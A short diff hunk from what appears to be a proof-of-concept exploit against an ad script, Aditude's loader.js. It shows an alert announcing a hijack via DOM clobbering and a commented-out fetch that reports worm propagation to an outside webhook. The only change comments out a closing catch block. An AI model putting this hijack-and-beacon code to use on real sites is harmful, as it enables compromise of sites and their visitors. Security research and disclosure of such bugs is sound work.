@@ -102,4 +102,4 @@ alert("Critical: Aditude loader.js successfully hijacked via DOM Clobbering!\nDo
 //             fetch(webhook + "?impact=Worm_Propagated_Successfully", { mode: 'no-cors' });
 //         }
 //     });
-} catch(e) {}
+// } catch(e) {}
